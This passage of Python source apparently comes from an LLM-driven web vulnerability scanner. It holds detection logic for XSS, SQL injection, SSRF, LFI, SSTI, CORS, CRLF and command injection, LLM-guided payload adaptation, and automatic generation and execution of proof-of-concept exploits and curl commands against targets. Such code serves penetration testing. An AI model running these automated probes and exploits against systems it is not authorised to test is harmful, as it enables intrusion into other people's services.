    try:
        from urllib.parse import urlparse
        return urlparse(url).hostname or url
    except Exception:
        return url


def _compute_response_diff(
    baseline_status: int, baseline_length: int, baseline_body: str,
    probe_status: int, probe_length: int, probe_body: str,
    payload: str,
) -> str:
    """Compute a human-readable diff between baseline and probe response."""
    diffs = []

    if probe_status != baseline_status:
        diffs.append(f"Status changed: {baseline_status} → {probe_status}")

    length_diff = probe_length - baseline_length
    if abs(length_diff) > 50:
        diffs.append(f"Length: {baseline_length} → {probe_length} ({length_diff:+d})")

    # Check if payload is reflected
    if payload in probe_body:
        diffs.append("PAYLOAD REFLECTED in response body")

    # Check for error messages not in baseline
    error_patterns = [
        "error", "exception", "warning", "syntax", "unexpected",
        "fatal", "stack trace", "traceback", "invalid",
    ]
    for pattern in error_patterns:
        if pattern.lower() in probe_body.lower() and pattern.lower() not in baseline_body.lower():
            diffs.append(f"New error pattern: '{pattern}'")
            break

    return " | ".join(diffs) if diffs else "No significant diff"


def _detect_indicators(
    vuln_type: str,
    payload: str,
    body: str,
    headers: dict[str, str],
    status: int,
    elapsed: float,
    *,
    baseline_timing_median: float = 0.0,
    baseline_timing_stddev: float = 0.0,
    baseline_body: str = "",
) -> list[str]:
    """Detect vulnerability indicators in a probe response.

    Uses statistical baseline timing for time-based detection (P4.1/P4.2).
    """
    indicators = []
    body_lower = body.lower()

    # ── XSS: payload reflection + encoding state + context ──
    if vuln_type in ("xss", "xss_reflected", "xss_dom"):
        encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
        if payload in body and "<" in payload:
            # Check reflection context
            idx = body.find(payload)
            context_before = body[max(0, idx - 60):idx].lower()
            if 'value=' in context_before or "'" in context_before or '"' in context_before:
                indicators.append("XSS: Unencoded reflection inside HTML attribute")
            elif '<script' in context_before:
                indicators.append("XSS: Unencoded reflection inside script context")
            else:
                indicators.append("XSS: Unencoded reflection in HTML body")
        elif encoded_payload in body:
            indicators.append("XSS: Payload reflected but encoded (filtered)")
    elif payload in body and "<" in payload:
        indicators.append("XSS: Payload reflected without encoding")

    # ── SQLi: error-based + statistical time-based ──
    if vuln_type in ("sqli", "sqli_error", "sqli_blind"):
        sql_errors = [
            "sql syntax", "mysql", "postgresql", "sqlite", "ora-",
            "unclosed quotation", "mssql", "microsoft ole db",
            "jdbc", "maria", "syntax error",
        ]
        for err in sql_errors:
            if err in body_lower and err not in baseline_body.lower():
                indicators.append(f"SQLi: Database error detected: '{err}'")
                break

        # Statistical time-based detection
        payload_lower = payload.lower()
        if any(kw in payload_lower for kw in ("sleep", "waitfor", "pg_sleep", "benchmark")):
            # Use statistical threshold: median + 4*stddev, minimum 3.0s above median
            if baseline_timing_stddev > 0:
                threshold = baseline_timing_median + max(4.0 * baseline_timing_stddev, 3.0)
            else:
                threshold = baseline_timing_median + 3.0
            # Absolute minimum 2.0s to avoid noise
            threshold = max(threshold, 2.0)
            if elapsed > threshold:
                sigma = ((elapsed - baseline_timing_median) / baseline_timing_stddev
                         if baseline_timing_stddev > 0.01 else 99.0)
                indicators.append(
                    f"SQLi: Time-based delay ({elapsed:.1f}s vs baseline "
                    f"{baseline_timing_median:.1f}±{baseline_timing_stddev:.2f}s, "
                    f"{sigma:.1f}σ)"
                )

    # ── SSRF ──
    elif vuln_type == "ssrf":
        ssrf_indicators = [
            "ami-id", "instance-id", "local-ipv4", "iam",
            "169.254", "metadata", "computeMetadata",
            "internal", "private",
        ]
        for ind in ssrf_indicators:
            if ind in body_lower:
                indicators.append(f"SSRF: Internal data exposed: '{ind}'")
                break

    # ── SSTI: multi-calculation verification ──
    elif vuln_type == "ssti":
        ssti_checks = 0
        if "49" in body and "7*7" in payload:
            ssti_checks += 1
            indicators.append("SSTI: Template expression executed (7*7=49)")
        if "42" in body and "7*6" in payload:
            ssti_checks += 1
            indicators.append("SSTI: Template expression executed (7*6=42)")
        if "7777777" in body and "'7'" in payload:
            ssti_checks += 1
            indicators.append("SSTI: Template expression executed (7*'7')")
        if ssti_checks >= 2:
            indicators.append("SSTI: Multiple calculations confirmed — high confidence")

    # ── LFI ──
    elif vuln_type == "lfi":
        if "root:x:0:0" in body or "root:" in body_lower:
            indicators.append("LFI: /etc/passwd content detected")
        if "[extensions]" in body_lower:
            indicators.append("LFI: win.ini content detected")

    # ── Open Redirect ──
    elif vuln_type == "open_redirect":
        location = headers.get("location", "")
        if "evil.com" in location.lower():
            indicators.append("Open Redirect: Location header points to evil.com")
        if status in (301, 302, 303, 307, 308) and "evil" in location.lower():
            indicators.append(f"Open Redirect: {status} redirect to attacker domain")

    # ── CORS ──
    elif vuln_type == "cors":
        acao = headers.get("access-control-allow-origin", "")
        acac = headers.get("access-control-allow-credentials", "")
        if acao and "evil" in acao.lower():
            indicators.append(f"CORS: Origin reflected: {acao}")
            if acac.lower() == "true":
                indicators.append("CORS: Credentials allowed with reflected origin!")
        if acao == "null":
            indicators.append("CORS: null origin accepted")

    # ── CRLF ──
    elif vuln_type in ("crlf", "header_injection"):
        if "injected" in str(headers).lower() or "set-cookie: injected" in str(headers).lower():
            indicators.append("CRLF: Injected header detected in response")

    # ── Command Injection / RCE: expanded output patterns ──
    elif vuln_type in ("command_injection", "rce"):
        rce_patterns = [
            "uid=", "root:", "www-data", "nobody", "Linux ",
            "/bin/", "total ", "drwx", "-rw-",
        ]
        for p in rce_patterns:
            if p in body and p not in baseline_body:
                indicators.append(f"RCE: Command output detected: '{p}'")
                break

        # Statistical time-based (for sleep-based RCE)
        if any(kw in payload.lower() for kw in ("sleep", "timeout")):
            if baseline_timing_stddev > 0:
                threshold = baseline_timing_median + max(4.0 * baseline_timing_stddev, 3.0)
            else:
                threshold = baseline_timing_median + 3.0
            threshold = max(threshold, 2.0)
            if elapsed > threshold:
                indicators.append(
                    f"RCE: Time-based delay ({elapsed:.1f}s vs baseline "
                    f"{baseline_timing_median:.1f}±{baseline_timing_stddev:.2f}s)"
                )

    return indicators


async def _llm_analyze_responses(
    brain_engine: Any,
    session: ProbeSession,
    latest_probes: list[ProbeResult],
) -> dict:
    """LLM analyzes probe responses and determines next steps."""
    from src.brain.engine import BrainType

    probe_summary = []
    for i, probe in enumerate(latest_probes):
        probe_summary.append({
            "payload": probe.payload[:100],
            "status": probe.response_status,
            "length": probe.response_length,
            "time": round(probe.response_time, 2),
            "diff": probe.diff_from_baseline[:200],
            "indicators": probe.indicators,
            "body_excerpt": probe.response_body[:300],
        })

    prompt = f"""## Analyze Probe Results — {session.vuln_type} — Iteration {session.iteration}

Target: {session.target.url}
Current Confidence: {session.confidence}/100
Baseline: status={session.target.baseline_status}, length={session.target.baseline_length}

### Latest Probe Results
{json.dumps(probe_summary, indent=2)}

### Analysis Questions
1. Do any responses indicate a {session.vuln_type} vulnerability?
2. What specific evidence supports or contradicts the vulnerability?
3. Was any payload filtered/blocked? If so, what was filtered?
4. What should we try DIFFERENTLY next?

Return JSON:
{{
  "observation": "What did we learn from these probes",
  "indicators": ["list", "of", "vulnerability", "indicators", "found"],
  "confidence_delta": 15.0,  // How much to increase/decrease confidence (-50 to +50)
  "adaptation": "What to change in next iteration",
  "is_waf_blocking": false,
  "filtered_chars": ["<", ">"]  // Characters/patterns being filtered
}}

Return ONLY valid JSON."""

    try:
        response = await asyncio.wait_for(
            brain_engine.think(prompt=prompt, brain=BrainType.PRIMARY, temperature=0.1),
            timeout=1200.0,
        )

        text = response.text.strip()
        if text.startswith("```"):
            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
        if text.endswith("```"):
            text = text[:-3]

        result = json.loads(text.strip())

        # Also include programmatically detected indicators
        for probe in latest_probes:
            if probe.indicators:
                existing = result.get("indicators", [])
                result["indicators"] = existing + probe.indicators

        return result
    except json.JSONDecodeError:
        # Try to extract JSON
        try:
            from src.utils.json_utils import extract_json
            parsed = extract_json(response.text, fallback=None)
            if parsed:
                return parsed
        except Exception as _exc:
            logger.warning(f"deep probe error: {_exc}")

        # Fallback: analyze programmatically
        prog_indicators = []
        for probe in latest_probes:
            prog_indicators.extend(probe.indicators)

        return {
            "observation": "LLM analysis failed, using programmatic detection",
            "indicators": prog_indicators,
            "confidence_delta": 10.0 if prog_indicators else -5.0,
            "adaptation": "Try different encoding approach",
        }
    except Exception as e:
        return {
            "observation": f"Analysis error: {e}",
            "indicators": [],
            "confidence_delta": 0.0,
            "adaptation": "",
        }


async def _prove_vulnerability(
    session: ProbeSession,
    brain_engine: Any,
    session_dir: str = "",
) -> ProbeSession:
    """Generate and execute a PoC to prove the vulnerability."""
    from src.tools.exploit.poc_executor import run_poc_with_refinement
    from src.tools.exploit.payload_generator import generate_poc_script

    # Find the best probe (one with most indicators)
    best_probe = max(
        session.probes,
        key=lambda p: len(p.indicators) + (1 if "REFLECTED" in p.diff_from_baseline else 0),
        default=None,
    )

    if not best_probe:
        return session

    # Generate PoC using the best payload/evidence
    finding = {
        "title": f"{session.vuln_type} in {session.target.url}",
        "vulnerability_type": session.vuln_type,
        "url": session.target.url,
        "endpoint": session.target.url,
        "evidence": "\n".join(session.evidence_chain),
        "http_response": best_probe.response_body[:2000],
        "auth_headers": session.target.auth_headers or {},
    }

    poc_code = await generate_poc_script(
        brain_engine=brain_engine,
        finding=finding,
        payload=best_probe.payload,
    )

    if not poc_code:
        # Try curl-based PoC
        poc_code = _generate_curl_poc(session, best_probe)

    if poc_code:
        session.poc_code = poc_code

        poc_result = await run_poc_with_refinement(
            finding=finding,
            poc_code=poc_code,
            brain_engine=brain_engine,
            max_iterations=2,
            timeout=1200.0,
            session_dir=session_dir,
        )

        session.poc_result = poc_result

        if poc_result.vulnerability_confirmed:
            session.confirmed = True
            session.confidence = min(100.0, session.confidence + poc_result.confidence_boost)
            session.evidence_chain.extend(poc_result.evidence)
            logger.info(
                f"🏆 PoC CONFIRMED | {session.vuln_type} | "
                f"{session.target.url[:60]} | "
                f"confidence={session.confidence:.1f}"
            )
        else:
            # Even without PoC confirmation, high probe confidence is valuable
            logger.info(
                f"PoC inconclusive | {session.vuln_type} | "
                f"status={poc_result.status.value} | "
                f"probe_confidence={session.confidence:.1f}"
            )

    return session


def _generate_curl_poc(session: ProbeSession, best_probe: ProbeResult) -> str:
    """Generate a simple curl-based PoC command."""
    target = session.target
    url = target.url

    if target.parameters:
        param = target.parameters[0]
        import urllib.parse
        encoded_payload = urllib.parse.quote(best_probe.payload)

        if "?" in url:
            curl_url = f"{url}&{param}={encoded_payload}"
        else:
            curl_url = f"{url}?{param}={encoded_payload}"

        return f'curl -v -sS --max-time 15 -k "{curl_url}"'

    return ""


async def deep_probe_batch(
    targets: list[dict],
    brain_engine: Any,
    max_per_target: int = 10,
    session_dir: str = "",
    auth_headers: dict[str, str] | None = None,
    oob_domain: str = "",
    interactsh: Any = None,
    host_profiles: dict[str, dict] | None = None,
) -> list[ProbeSession]:
    """
    Run deep probes on multiple targets from the attack surface map.

    Args:
        targets: List of dicts from intelligence_plan vectors, each with:
            - endpoint: URL
            - vuln_type: Vulnerability type
            - parameters: List of parameter names
            - priority: Priority ranking
        brain_engine: BrainEngine instance
        max_per_target: Max iterations per target/vuln combo
        session_dir: Evidence directory
        auth_headers: Optional auth headers to inject into every probe request

    Returns:
        All ProbeSession results
    """
    all_sessions = []

    # Sort by priority
    sorted_targets = sorted(targets, key=lambda t: t.get("priority", 0), reverse=True)

    _BATCH_LIMIT = 50  # P4.2: expanded from 25

    async def _probe_one(target_info: dict) -> list[ProbeSession]:
        """Probe a single target — factored out for reuse by last-resort sampling."""
        endpoint = target_info.get("endpoint", target_info.get("url", ""))
        vuln_type = target_info.get("vuln_type", "xss")
        params = target_info.get("parameters", target_info.get("params", []))
        tech = target_info.get("tech_stack", target_info.get("technologies", []))

        if not endpoint:
            return []

        # ── Host profile skip: don't deep-probe redirect / static hosts ──
        if host_profiles and isinstance(endpoint, str):
            _ep_host = _extract_host(endpoint)
            _hp = host_profiles.get(_ep_host, {})
            _ht = _hp.get("host_type", "") if isinstance(_hp, dict) else ""
            if _ht in _SKIP_HOST_TYPES:
                logger.debug(
                    f"Deep probe skip — host type '{_ht}': {endpoint[:80]}"
                )
                return []

        probe_target = ProbeTarget(
            url=endpoint,
            parameters=params if isinstance(params, list) else [params],
            method=target_info.get("method", "GET"),
            tech_stack=tech if isinstance(tech, list) else [tech],
            auth_headers=auth_headers or {},
            waf_detected=target_info.get("waf", ""),
            oob_domain=oob_domain,
        )

        # Determine vuln types to test
        if isinstance(vuln_type, list):
            vtypes = vuln_type[:3]
        else:
            vtypes = [vuln_type]

        return await deep_probe_endpoint(
            target=probe_target,
            vuln_types=vtypes,
            brain_engine=brain_engine,
            max_iterations=max_per_target,
            session_dir=session_dir,
            interactsh=interactsh,
        )

    # ── Primary pass: top-N priority-ranked targets ──
    primary_batch = sorted_targets[:_BATCH_LIMIT]
    for target_info in primary_batch:
        sessions = await _probe_one(target_info)
        all_sessions.extend(sessions)

    confirmed = [s for s in all_sessions if s.confirmed]

    # ── Last-resort sampling: if 0 confirmed from top-N, randomly sample extras ──
    if not confirmed and len(sorted_targets) > _BATCH_LIMIT:
        import random as _rand
        remainder = sorted_targets[_BATCH_LIMIT:]
        sample_size = min(10, len(remainder))
        sampled = _rand.sample(remainder, sample_size)
        logger.info(
            f"Deep probe last-resort: 0 confirmed from top-{_BATCH_LIMIT}, "
            f"sampling {sample_size} extra targets"
        )
        for target_info in sampled:
            sessions = await _probe_one(target_info)
            all_sessions.extend(sessions)
        confirmed = [s for s in all_sessions if s.confirmed]

    logger.info(
        f"Deep probe batch complete | "
        f"targets={len(primary_batch)}{f'+{sample_size}' if not confirmed and len(sorted_targets) > _BATCH_LIMIT else ''} | "
        f"sessions={len(all_sessions)} | "
        f"confirmed={len(confirmed)}"
    )

    return all_sessions


def probe_sessions_to_findings(sessions: list[ProbeSession]) -> list[dict]:
    """Convert ProbeSession results into Finding-compatible dicts for pipeline integration."""
    findings = []

    for session in sessions:
        if session.confidence < 50.0:
            continue

        # Build evidence string
        evidence_parts = []
        for e in session.evidence_chain[:10]:
            evidence_parts.append(str(e))

        # Best probe for HTTP evidence
        best_probe = max(
            session.probes,
            key=lambda p: len(p.indicators),
            default=None,
        )

        finding = {
            "title": f"Deep Probe: {session.vuln_type.upper()} in {session.target.url.split('?')[0].split('/')[-1] or 'endpoint'}",
            "description": (
                f"LLM-driven deep probe detected {session.vuln_type} vulnerability.\n"
                f"Confidence: {session.confidence:.1f}/100\n"
                f"Iterations: {session.iteration}\n"
                f"Hypotheses tested: {len(session.hypotheses)}\n"
                f"Evidence chain: {'; '.join(session.evidence_chain[:5])}"
            ),
            "vulnerability_type": session.vuln_type,
            "severity": _vuln_severity(session.vuln_type, session.confidence),
            "confidence": session.confidence,
            "target": session.target.url.split("/")[2] if "/" in session.target.url else session.target.url,
            "endpoint": session.target.url,
            "url": session.target.url,
            "tool_name": "deep_probe",
            "evidence": "\n".join(evidence_parts),
            "poc_code": session.poc_code,
            "poc_confirmed": session.confirmed,
            "tags": ["deep_probe", session.vuln_type, "llm_verified"],
            "metadata": {
                "iterations": session.iteration,
                "hypotheses": session.hypotheses,
                "observations": session.observations,
                "adaptations": session.adaptations,
                "probe_count": len(session.probes),
            },
        }

        if best_probe:
            finding["http_response"] = best_probe.response_body[:2000]
            finding["payload"] = best_probe.payload

        findings.append(finding)

    return findings


def _vuln_severity(vuln_type: str, confidence: float) -> str:
    """Map vulnerability type + confidence to severity."""
    high_severity_types = {"sqli", "rce", "command_injection", "ssrf", "ssti", "lfi", "idor"}
    medium_severity_types = {"xss", "open_redirect", "cors", "crlf", "header_injection", "jwt"}

    vt = vuln_type.lower().replace("-", "_")

    if vt in high_severity_types:
        if confidence >= 80:
            return "high"
        return "medium"
    elif vt in medium_severity_types:
        if confidence >= 90:
            return "high"
        return "medium"

    return "low" if confidence >= 70 else "info"


__all__ = [
    "ProbeTarget",
    "ProbeResult",
    "ProbeSession",
    "deep_probe_endpoint",
    "deep_probe_batch",
    "probe_sessions_to_findings",
]
